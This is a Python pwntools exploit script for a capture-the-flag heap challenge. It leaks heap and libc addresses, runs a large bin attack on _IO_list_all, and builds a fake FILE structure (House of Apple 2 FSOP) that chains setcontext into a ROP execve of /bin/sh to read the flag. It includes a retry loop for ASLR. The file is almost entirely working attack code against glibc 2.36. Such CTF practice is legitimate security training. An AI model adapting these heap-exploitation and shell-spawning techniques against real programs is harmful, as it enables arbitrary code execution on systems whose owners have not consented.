#!/usr/bin/env python3
from pwn import *
import sys
import re
import subprocess

# --- Configuration ---
context.binary = ELF("./chall", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
context.log_level = 'info'

HOST, PORT = "ctf.csd.lol", 2024
POW_RE = re.compile(rb"sh -s ([^\s]+)")

# --- Constants & Offsets (GLIBC 2.36) ---
CHUNK_USER_SIZE = 0xFE0
OFFSET_MAIN_ARENA = 0x1D3CC0
OFFSET_IO_LIST_ALL = 0x1D4660
OFFSET_WFILE_JUMPS = 0x1D00A0
MXCSR_VAL = 0x1F80

# --- Helper Functions ---

def solve_pow(r):
    log.info("Solving Proof of Work...")
    banner = r.recvuntil(b"solution: ")
    m = POW_RE.search(banner)
    if not m: return
    token = m.group(1).decode()
    try:
        solution = subprocess.check_output(["./redpwnpow", token]).strip()
        r.sendline(solution)
    except:
        log.warning("PoW solver failed/missing. Skipping...")

def start_process():
    if args.REMOTE:
        r = remote(HOST, PORT)
        solve_pow(r)
        return r
    else:
        return process("./chall")

def consume_prompt(r):
    r.recvuntil(b"0) exit\n> ")

def add_chunk(r, idx, size, content=b""):
    r.send(f"1\n{idx}\n{size}\n".encode())
    if size != 0: r.send(content)
    consume_prompt(r)

def delete_chunk(r, idx):
    r.send(f"2\n{idx}\n".encode())
    consume_prompt(r)

def edit_chunk(r, idx, content):
    r.send(f"3\n{idx}\n".encode())
    r.recvuntil(b"data: ")
    r.send(content)
    consume_prompt(r)

def view_chunk(r, idx):
    r.send(f"4\n{idx}\n".encode())
    r.recvuntil(b"data: ")
    raw_data = r.recvuntil(b"1) alloc\n", drop=True)
    consume_prompt(r)
    if raw_data.endswith(b"\n"): return raw_data[:-1]
    return raw_data

def unpack_u64(data):
    return u64(data.ljust(8, b"\x00"))

def get_chunk_metadata(r, idx_pivot, idx_overflow, idx_target):
    """
    Attempts to leak the chunk limit pointer.
    Includes brute-force padding to handle null bytes in ASLR addresses.
    """
    delete_chunk(r, idx_pivot)
    add_chunk(r, idx_overflow, 0xFFFF_FFF0, b"Z")
    add_chunk(r, idx_target, 0, b"")
    
    leak = view_chunk(r, idx_target)
    if leak: return unpack_u64(leak)

    for pad_len in range(1, 8):
        delete_chunk(r, idx_pivot)
        add_chunk(r, idx_overflow, 0xFFFF_FFF0, b"Z")
        add_chunk(r, idx_target, pad_len, b"A" * pad_len)
        leak = view_chunk(r, idx_target)
        if len(leak) > pad_len:
            delete_chunk(r, idx_pivot)
            add_chunk(r, idx_overflow, 0xFFFF_FFF0, b"Z")
            add_chunk(r, idx_target, pad_len, b"\x00"*pad_len)
            return unpack_u64(b"\x00"*pad_len + leak[pad_len:])
            
    raise RuntimeError("Failed to leak metadata (Bad ASLR byte)")

def get_obstack_addrs(r, idx_pivot, idx_overflow, idx_target):
    limit = get_chunk_metadata(r, idx_pivot, idx_overflow, idx_target)
    base = limit - CHUNK_USER_SIZE
    header = base - 0x10
    return base, header, limit

def construct_fsop_payload(libc_obj, header_addr, shell_cmd):
    """
    Constructs a Fake FILE structure for House of Apple 2 / FSOP.
    Target chain: _IO_wfile_overflow -> _IO_wdoallocbuf -> setcontext
    """
    addr_wfile_jumps = libc_obj.address + OFFSET_WFILE_JUMPS
    addr_setcontext = libc_obj.sym['setcontext']
    addr_binsh = next(libc_obj.search(b"/bin/sh\x00"))
    gadget_pop_rdi = next(libc_obj.search(asm('pop rdi; ret')))
    gadget_pop_rax_rdx_rbx = next(libc_obj.search(asm('pop rax; pop rdx; pop rbx; ret')))
    gadget_syscall = next(libc_obj.search(asm('syscall; ret')))

    off_wide_data = 0x108
    off_wide_vtable = 0x188
    off_fenv = 0x1A0
    addr_wide_data = header_addr + off_wide_data
    addr_wide_vtable = header_addr + off_wide_vtable
    addr_fenv = header_addr + off_fenv
    addr_argv = addr_wide_data + 0x38
    addr_argc = addr_wide_data + 0x58
    addr_cmd = addr_wide_data + 0x60

    payload_buf = bytearray(b"\x00" * 0x200)
    def pack_qword(offset, val): payload_buf[offset:offset+8] = p64(val)
    def pack_dword(offset, val): payload_buf[offset:offset+4] = p32(val)

    # 1. Fake _IO_FILE
    pack_dword(0x00, 0); pack_qword(0x20, 0); pack_qword(0x28, 1); pack_qword(0x68, 0)
    pack_qword(0x70, addr_argv); pack_qword(0x88, 0); pack_qword(0xA0, addr_wide_data)
    pack_qword(0xA8, gadget_pop_rdi); pack_dword(0xC0, 0); pack_qword(0xD8, addr_wfile_jumps)
    pack_qword(0xE0, addr_fenv); pack_dword(0x1C0, MXCSR_VAL)

    # 2. Fake _IO_wide_data (ROP Stack)
    pack_qword(off_wide_data, addr_binsh)
    pack_qword(off_wide_data + 8, gadget_pop_rax_rdx_rbx)
    pack_qword(off_wide_data + 16, 59); pack_qword(off_wide_data + 24, 0)
    pack_qword(off_wide_data + 32, 0); pack_qword(off_wide_data + 40, gadget_syscall)
    pack_qword(off_wide_data + 48, 0)
    
    # Argv Array construction
    pack_qword((addr_argv - header_addr), addr_binsh)
    pack_qword((addr_argv - header_addr) + 8, addr_argc)
    pack_qword((addr_argv - header_addr) + 16, addr_cmd)
    pack_qword((addr_argv - header_addr) + 24, 0)
    
    # Command Strings
    c_off = addr_argc - header_addr
    payload_buf[c_off : c_off+3] = b"-c\x00"
    cmd_off = addr_cmd - header_addr
    payload_buf[cmd_off : cmd_off + len(shell_cmd) + 1] = shell_cmd + b"\x00"
    
    # 3. Fake Wide VTable -> setcontext
    pack_qword(off_wide_data + 0xE0, addr_wide_vtable)
    pack_qword(off_wide_vtable + 0x68, addr_setcontext)
    
    # 4. FEnv data
    fenv_data = b"\x7f\x03\x00\x00\xff\xff" + b"\x00"*22
    payload_buf[off_fenv : off_fenv + len(fenv_data)] = fenv_data

    return bytes(payload_buf)

def exploit(r):
    # [1] Leak Heap Base
    log.info("Phase 1: Leaking Heap...")
    add_chunk(r, 1, 0, b"")
    add_chunk(r, 9, 0xFFFF_FFF0, b"Z")
    add_chunk(r, 0, 0, b"")
    chunk_A_base, chunk_A_hdr, _ = get_obstack_addrs(r, 1, 9, 0)
    log.success(f"Chunk A Base: {hex(chunk_A_base)}")

    # [2] Leak Libc (Unsorted Bin)
    log.info("Phase 2: Leaking Libc...")
    delete_chunk(r, 1); add_chunk(r, 2, 0x10, b"A"*0x10)
    # Shrink chunk A (0xFF0 -> 0xF00)
    delete_chunk(r, 1); add_chunk(r, 3, 0xFFFF_FFE0, b"Z")
    add_chunk(r, 4, 0x10, p64(0) + p64(0xF01))
    # Padding and Fake next chunk
    delete_chunk(r, 1); add_chunk(r, 5, 0xEE0, b"F")
    add_chunk(r, 6, 0x10, p64(0xF00) + p64(0xF1))
    # Trigger obstack_free(NULL)
    delete_chunk(r, 63)
    
    leak = view_chunk(r, 0)
    if not leak: raise RuntimeError("Unsorted bin leak failed")
    
    libc.address = unpack_u64(leak) - OFFSET_MAIN_ARENA
    log.success(f"Libc Base: {hex(libc.address)}")
    
    # Alignment check (ASLR sanity check)
    if (libc.address & 0xfff) != 0: raise RuntimeError("Bad Libc Alignment")

    # [3] Large Bin Attack
    log.info("Phase 3: Large Bin Attack...")
    add_chunk(r, 10, 0x200, b"B")
    # Overwrite A->bk_nextsize
    edit_chunk(r, 2, p64(chunk_A_hdr) + p64(libc.address + OFFSET_IO_LIST_ALL - 0x20))
    chunk_B_base, chunk_B_hdr, chunk_B_limit = get_obstack_addrs(r, 10, 11, 12)
    
    # Prepare B for Large Bin insertion
    delete_chunk(r, 10); add_chunk(r, 17, 0xFFFF_FFF0, b"Z")
    add_chunk(r, 18, 0x10, p64(chunk_B_limit) + p64(0))
    # Shrink B (0xFF0 -> 0xE00)
    delete_chunk(r, 10); add_chunk(r, 13, 0xFFFF_FFE0, b"Z")
    add_chunk(r, 14, 0x10, p64(0) + p64(0xE01))
    delete_chunk(r, 10)
    # Realign
    add_chunk(r, 15, (chunk_B_hdr + 0xE00 - (chunk_B_base+0x10)) & 0xFFFFFFFF, b"P")
    add_chunk(r, 16, 0x10, p64(0xE00) + p64(0x1F1))
    delete_chunk(r, 63)
    
    # Trigger Attack: B < A -> B inserted into list -> _IO_list_all overwritten
    try: add_chunk(r, 30, 0x200, b"T")
    except: pass

    # [4] FSOP Payload
    log.info("Phase 4: Sending FSOP Payload...")
    c_base, _, _ = get_obstack_addrs(r, 30, 31, 32)
    payload = construct_fsop_payload(libc, chunk_B_hdr, b"cat flag* /flag 2>/dev/null")
    
    delete_chunk(r, 30)
    # Write payload to B_Header (now _IO_list_all)
    add_chunk(r, 40, (chunk_B_hdr - (c_base+0x10)) & 0xFFFFFFFF, b"S")
    add_chunk(r, 41, len(payload), payload)
    
    # Exit -> _IO_flush_all -> shell
    flag = r.recvuntil(b"}").decode(errors="ignore")
    
    if "csd{" in flag:
        print("Flag: " + flag.strip())
        return True
    return False

def main():
    attempt = 1
    # Auto-Retry Loop for ASLR stability
    while True:
        log.info(f"--- ATTEMPT {attempt} ---")
        try:
            r = start_process()
            if exploit(r):
                r.close()
                break
            r.close()
        except KeyboardInterrupt:
            exit(0)
        except Exception as e:
            log.warning(f"Exploit failed: {e}. Retrying due to bad ASLR layout...")
            try: r.close()
            except: pass
        attempt += 1

if __name__ == "__main__":
    main()